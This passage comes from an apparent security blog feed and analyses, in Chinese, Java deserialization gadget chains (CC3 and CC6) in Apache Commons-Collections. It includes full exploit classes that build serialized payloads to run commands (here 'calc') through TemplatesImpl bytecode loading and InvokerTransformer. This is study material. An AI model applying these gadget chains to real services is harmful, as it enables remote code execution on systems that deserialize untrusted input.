class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3ExpFinal6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//    templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438817.png" alt="image-20250122132748188"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>流程图结合一下CC1和CC6</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501260014097.png" alt="image-20250126000226864"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/">Java反序列化Commons-Collections篇04-CC3链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.nbcares.top/archives/CC3">Java_Commons-Collections 3 (CC3) 学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://gtl-ju.github.io/2023/08/02/CommonCollections3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">CommonCollections3利用链分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 6利用链分析</title>
    <link href="http://example.com/2025/01/16/Java%E5%AE%89%E5%85%A8-Commons-Collections-6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/01/16/Java%E5%AE%89%E5%85%A8-Commons-Collections-6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2025-01-16T08:30:40.000Z</published>
    <updated>2025-01-22T06:37:27.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续开始审计CC链。</p><p>前面审计了CC1链，CC1链要求环境中的jdk版本低于<code>8u71</code>以及<code>Commons-Collections 3.2.1</code>，而CC6不受jdk版本限制，因此可以说CC6就是一个可以在高版本jdk利用的CC链。</p><blockquote><p>一句话介绍CC6，那就是CC6 &#x3D; CC1 +URLDNS</p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>JDK 8u71</li><li>Commoons-Collection 3.2.1</li></ul><p>继续用CC1的环境就可以，参考上篇文章<a class="link" href="https://blog.p0l1st.top/2024/08/30/Java%E5%AE%89%E5%85%A8-Common-Collections-1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">Java安全-Common-Collections 1利用链分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="CC6利用链分析"><a href="#CC6利用链分析" class="headerlink" title="CC6利用链分析"></a>CC6利用链分析</h1><p>CC6链的前半条链与<code>LazyMap</code>版的CC1链一样，我们先来回顾一下<code>LazyMap</code>版的CC1链。</p><h2 id="回顾CC1"><a href="#回顾CC1" class="headerlink" title="回顾CC1"></a>回顾CC1</h2><p>我们在分析<code>LazyMap</code>版的CC1时讲过，链子的尾部就是<code>InvokerTransformer</code>类中的<code>transform</code>方法</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633969.png" alt="image-20250116135852334" style="zoom:80%;"><p>这里的<code>tansform</code>方法可以通过类似反射的方式获取并执行</p><p>我们在CC1中通过<code>InvokerTransformer</code>获取到<code>Runtime</code>来执行命令</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class,&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633951.png" alt="image-20250116140448683"></p><p>通过<code>ChainedTransformer</code>来简化这个过程</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">//构造setValue的可控参数</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure></div><p>然后就是找谁调用了<code>transforme</code>方法</p><p>前面的分析中，用的是<code>LazyMap</code>类的<code>get</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633939.png" alt="image-20250116140947764"></p><p>到这里是CC6和CC1相同的部分，我们下面开始分析CC6</p><h2 id="分析CC6"><a href="#分析CC6" class="headerlink" title="分析CC6"></a>分析CC6</h2><h3 id="寻找链子"><a href="#寻找链子" class="headerlink" title="寻找链子"></a>寻找链子</h3><p>我们继续从<code>LazyMap</code>的<code>get</code>方法开始分析</p><p>首先是<code>TiedMapEntry</code>类中的<code>getValue()</code>方法调用了<code>LazyMap</code>的<code>get()</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633914.png" alt="image-20250116141805732"></p><p>这里的<code>map</code>是<code>TiedMapEntry</code>构造函数定义，可控</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633964.png" alt="image-20250116142156960" style="zoom:67%;"><p>我们用<code>TiedMapEntry</code>写一个Exp，确保这条链子可用</p><blockquote><p>由于<code>TiedMapEntry</code>作用域是public，所以不需要通过反射获取它的方法，可以直接调用并修改。</p></blockquote><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntryExp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] tansformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(tansformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633988.png" alt="image-20250116143129201"></p><blockquote><p>这里其实就是new了一个<code>TiedMapEntry</code>对象，调用它的<code>getValue()</code>方法，然后再去调用<code>map.get(key)</code></p></blockquote><p>现在确认了<code>TiedMapEntry</code>这一段链子的可用性，往上找谁调用了<code>TiedMapEntry</code>中的<code>getValue</code>方法</p><p>正好这个类有个<code>hashCode</code>方法调用了<code>getValue</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633492.png" alt="image-20250116144014938"></p><p>看到<code>hashCode</code>不难想到<code>URLDNS</code>链</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633711.png" alt="img" style="zoom: 67%;"><p><code>HashMap</code>类本身就是一个完美的入口类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntryExp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] tansformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(tansformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里的<code>hash(key)</code>会自动调用<code>key.hashCode()</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633721.png" alt="image-20250116145354017"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633994.png" alt="image-20250116145410992"></p><p><code>key</code>可以通过<code>HashMap.put()</code>设置</p><p>但是<code>HashMap.put()</code>本身就会调用一次<code>hash</code>，其实就是<code>HashMap.put()</code>会自动调用<code>hashCode()</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633160.png" alt="image-20250116145615410"></p><p>这就会导致命令在<strong>序列化</strong>的时候就提前触发</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><blockquote><p>参考URLDNS链中的思想，执行<code>put()</code>方法的时候，先不让其命令执行，反序列化的时候再命令执行</p></blockquote><p><code>put</code>前将<code>LazyMap</code>的<code>factory</code>属性修改为<strong>随便一个值</strong>，之后再通过反射(作用域是<code>protected</code>)修改回来</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633281.png" alt="image-20250116152854333"></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMapClass, chainedTransformer);</span><br></pre></td></tr></table></figure></div><h3 id="最终Exp"><a href="#最终Exp" class="headerlink" title="最终Exp"></a>最终Exp</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> 